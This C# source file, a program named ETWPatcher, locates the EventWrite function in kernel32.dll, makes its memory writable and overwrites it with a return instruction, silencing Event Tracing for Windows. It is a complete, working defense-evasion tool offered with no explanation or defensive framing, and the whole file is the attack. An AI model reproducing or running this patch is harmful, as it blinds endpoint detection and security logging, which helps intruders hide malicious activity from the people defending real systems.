using System;
using System.Runtime.InteropServices;

namespace ETWPatcher
{
    class Program
    {
        private const uint PAGE_EXECUTE_READWRITE = 0x40;

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public static extern IntPtr LoadLibrary(string lpFileName);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

        static void Main(string[] args)
        {
            try
            {
                IntPtr kernel32 = LoadLibrary(@"kernel32.dll");
                if (kernel32 == IntPtr.Zero)
                {
                    Console.WriteLine("[-] Failed to load kernel32.dll");
                    return;
                }
                Console.WriteLine("[+] Loaded kernel32.dll successfully.");
                IntPtr etwaddr = GetProcAddress(kernel32, "EventWrite");
                if (etwaddr == IntPtr.Zero)
                {
                    Console.WriteLine("[-] Failed to find EventWrite address.");
                    return;
                }
                Console.WriteLine($"[+] Found EventWrite at address: {etwaddr.ToString("X")}");
                byte[] patch = (IntPtr.Size == 8) ? new byte[] { 0xC3 } : new byte[] { 0xC2, 0x14, 0x00 };
                uint oldProtect;
                if (VirtualProtect(etwaddr, (UIntPtr)patch.Length, PAGE_EXECUTE_READWRITE, out oldProtect))
                {
                    Marshal.Copy(patch, 0, etwaddr, patch.Length);
                    VirtualProtect(etwaddr, (UIntPtr)patch.Length, oldProtect, out oldProtect);
                    Console.WriteLine("[+] ETW Event Write function patched successfully.");
                }
                else
                {
                    Console.WriteLine("[-] Failed to change memory protection.");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[-] An error occurred: {ex.Message}");
            }
        }
    }
}